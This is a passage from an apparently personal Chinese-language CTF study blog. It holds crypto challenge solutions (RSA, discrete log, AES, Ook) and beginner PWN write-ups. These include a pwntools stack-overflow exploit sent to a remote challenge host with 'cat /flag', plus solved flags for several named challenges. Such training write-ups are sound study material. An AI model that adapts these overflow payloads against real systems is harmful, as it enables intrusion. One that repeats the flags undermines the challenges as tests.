number">358553002064450</span>n <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>c2<span class="token operator">*</span>c4 <span class="token operator">-</span> c8<span class="token punctuation">,</span> c2 <span class="token operator">**</span> <span class="token number">2</span> <span class="token operator">-</span> c4<span class="token punctuation">)</span><span class="token comment"># 1054494004042394&lt;16> = 2 · 18195301 · 28977097</span>p <span class="token operator">=</span> <span class="token number">28977097</span>q <span class="token operator">=</span> <span class="token number">18195301</span>n <span class="token operator">=</span> p<span class="token operator">*</span>qphi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> <span class="token number">1</span>e <span class="token operator">=</span> sympy<span class="token punctuation">.</span>discrete_log<span class="token punctuation">(</span>n<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">"""808723997b'345y!'npuctf&#123;345y!&#125;"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>求e可以使用离散对数问题的求解获得。</p><h2 id="离散对数问题"><a href="#离散对数问题" class="headerlink" title="离散对数问题"></a>离散对数问题</h2><blockquote><p>基于离散对数问题的困难问题构造的密码，离散对数问题既是高中时的log问题，幂的逆问题。</p></blockquote><h3 id="一般离散对数问题"><a href="#一般离散对数问题" class="headerlink" title="一般离散对数问题"></a>一般离散对数问题</h3><h4 id="网鼎杯-2020-青龙组-you-raise-me-up"><a href="#网鼎杯-2020-青龙组-you-raise-me-up" class="headerlink" title="[网鼎杯 2020 青龙组]you_raise_me_up"></a>[网鼎杯 2020 青龙组]you_raise_me_up</h4><p>给出的脚本为</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> randomn <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">512</span>m <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">1</span>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">'m = '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">'c = '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token comment"># m = 391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span><span class="token comment"># c = 6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>m是取的随机数，但是最后给出来了，那这个问题就落在了下面的这条语句上面了</p><pre class="line-numbers language-none"><code class="language-none">c &#x3D; pow(m, bytes_to_long(flag), n)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>既</p><script type="math/tex; mode=display">c = m ^ {flag}\quad mod \quad{n} \\也就是\\m ^ {flag} = c\quad mod \quad{n}</script><p>此时欲求得flag，sympy是有专门的函数的，这个函数的用法是<code>flag = sympy.discrete_log(n, c, m)</code>，如此即可求得flag。</p><p>故写解题脚本如下所示</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> sympyn <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">512</span>m <span class="token operator">=</span> <span class="token number">391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span>c <span class="token operator">=</span> <span class="token number">6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span>flag <span class="token operator">=</span> sympy<span class="token punctuation">.</span>discrete_log<span class="token punctuation">(</span>n<span class="token punctuation">,</span> c<span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># b'flag&#123;5f95ca93-1594-762d-ed0b-a9139692cb4a&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h2><h3 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h3><h4 id="ACTF新生赛2020-crypto-aes"><a href="#ACTF新生赛2020-crypto-aes" class="headerlink" title="[ACTF新生赛2020]crypto-aes"></a>[ACTF新生赛2020]crypto-aes</h4><p>给出的脚本大概就像是这样的，</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">import</span> os<span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">16</span>    iv <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>bytes_to_long<span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">^</span> bytes_to_long<span class="token punctuation">(</span>iv<span class="token punctuation">)</span><span class="token punctuation">)</span>    aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>    enc_flag <span class="token operator">=</span> aes<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span><span class="token string">b'FLAG'</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>enc_flag<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里为什么随机的key和iv我们仍然是可以破解的呢？因为这个key是两个byte的重复，而且给出了key和iv的按位异或的值。并且这个异或是从右向左异或的，key的长度大于iv的长度，所以前面的很多位来说，异或后的值是等于key的，故此可得key、iv，亦可解密。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">import</span> os<span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>key_iv <span class="token operator">=</span> <span class="token number">91144196586662942563895769614300232343026691029427747065707381728622849079757</span>enc_flag <span class="token operator">=</span> <span class="token string">b'\x8c-\xcd\xde\xa7\xe9\x7f.b\x8aKs\xf1\xba\xc75\xc4d\x13\x07\xac\xa4&amp;\xd6\x91\xfe\xf3\x14\x10|\xf8p'</span>key <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>key_iv<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">16</span>iv <span class="token operator">=</span> key_iv <span class="token operator">^</span> bytes_to_long<span class="token punctuation">(</span>key<span class="token punctuation">)</span>iv <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>iv<span class="token punctuation">)</span>aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>flag <span class="token operator">=</span> aes<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>enc_flag<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># b'actf&#123;W0W_y0u_can_so1v3_AES_now!&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Rabbit"><a href="#Rabbit" class="headerlink" title="Rabbit"></a>Rabbit</h3><h4 id="ctfshow、crypto6"><a href="#ctfshow、crypto6" class="headerlink" title="ctfshow、crypto6"></a>ctfshow、crypto6</h4><p>提示为：<code>密钥为**加密方式**名称，区分大小写</code></p><pre class="line-numbers language-none"><code class="language-none">密文：U2FsdGVkX19mGsGlfI3nciNVpWZZRqZO2PYjJ1ZQuRqoiknyHSWeQv8ol0uRZP94MqeD2xz+密钥：加密方式名称<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这种<code>U2Fsd</code>开头的一般就是那几种<code>对称加密</code>，这个对称加密有个专门的网站<a href="https://www.sojson.com/encrypt_aes.html">https://www.sojson.com/encrypt_aes.html</a></p><p>然后从aes一个一个地试试就好了。</p><p><img src="/2021/05/28/CTF/image-20210720145845078.png" alt></p><h4 id="ctfshow、crypto7"><a href="#ctfshow、crypto7" class="headerlink" title="ctfshow、crypto7"></a>ctfshow、crypto7</h4><p><strong>TAG: Ook!</strong></p><p><a href="https://ctf.bugku.com/tool/brainfuck">Ook在线网站</a></p><pre class="line-numbers language-none"><code class="language-none">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook?Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook?Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook.Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook?Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook.Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook.Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook. Ook.Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook!Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook.Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook.Ook? Ook! Ook. Ook? Ook. Ook. Ook! Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook!Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook!Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook!Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook! Ook. Ook? Ook. flag&#123;b615c4b79a1aede83b9ae67104ff4eb5&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210720150259583.png" alt></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p><a href="https://zhuanlan.zhihu.com/p/129837931">kali配置安装pwn环境</a></p><h3 id="安装peda"><a href="#安装peda" class="headerlink" title="安装peda"></a>安装peda</h3><p>我先安装的是peda，直接就两个命令，下面的两个命令</p><pre class="line-numbers language-command" data-language="command"><code class="language-command">git clone https:&#x2F;&#x2F;github.com&#x2F;longld&#x2F;peda.git ~&#x2F;pedaecho &quot;source ~&#x2F;peda&#x2F;peda.py&quot; &gt;&gt; ~&#x2F;.gdbinit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>直接gdb命令出现的就是peda的前缀了。</p><p><strong>对pwn的难度估计出现了重大失误，这个门槛还是很高的，等下学期学了病毒分析再入门吧。</strong></p><h2 id="一般pwn"><a href="#一般pwn" class="headerlink" title="一般pwn"></a>一般pwn</h2><h3 id="绝对签到题"><a href="#绝对签到题" class="headerlink" title="绝对签到题"></a>绝对签到题</h3><h4 id="buu、test-your-nc"><a href="#buu、test-your-nc" class="headerlink" title="buu、test_your_nc"></a>buu、test_your_nc</h4><p>直接nc就行了，这个主要是好像pwn里面经常是要使用nc工具的。</p><pre class="line-numbers language-none"><code class="language-none">nc node3.buuoj.cn 28024cat &#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210601121350820.png" alt="image-20210601121350820"></p><h2 id="普通溢出题目"><a href="#普通溢出题目" class="headerlink" title="普通溢出题目"></a>普通溢出题目</h2><h3 id="普通栈溢出"><a href="#普通栈溢出" class="headerlink" title="普通栈溢出"></a>普通栈溢出</h3><h4 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h4><p><img src="/2021/05/28/CTF/image-20210711195254351.png" alt></p><p>使用64位的ida解决。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// main函数的反汇编代码如下</span><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+1h] [rbp-Fh] BYREF</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"please input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>s<span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>argv<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"ok,bye!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>据判断，gets函数具有栈溢出漏洞</p><p><img src="/2021/05/28/CTF/image-20210714201214783.png" alt></p><p>s的大小限制为15位(F - 0 = F[F为10进制的15])，只要传入超过15个byte就会导致溢出，然后转到system函数(程序中的fun函数里面有system方法)，然后就再看看ida里面他的函数的开始地址<strong>0x401186</strong></p><p><img src="/2021/05/28/CTF/image-20210714202217709.png" alt></p><p>然后就认为我们的payload可以为如下</p><pre class="line-numbers language-none"><code class="language-none">b&quot;a&quot; * 15 + p64(0x401186)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>p64</strong>代表的是这个地址是64位机的地址pack 64 bits number。</p><pre class="line-numbers language-none"><code class="language-none">p32&#x2F;p64: 打包一个整数，分别打包为32位或64位u32&#x2F;u64: 解包一个字符串，得到整数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后写脚本如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">27897</span><span class="token punctuation">)</span>buf_1 <span class="token operator">=</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">15</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x401186</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>buf_1<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"cat /flag"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;42bfbcd2-053e-4a41-8581-3a8e676a4c9a&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h4><p><strong>TAG：gets栈溢出漏洞，后门函数</strong></p><p>听说大家ida打开之前都会使用checksec来检查一下应用程序是否是有保护的，这里的checksec是可以直接下的，但是好像某个工具里面自带的也是有的，这里为了方便，先直接<code>sudo apt install checksec</code>来下载一下这个工具。</p><p>然后就是直接看ida了，main函数的内容为</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token 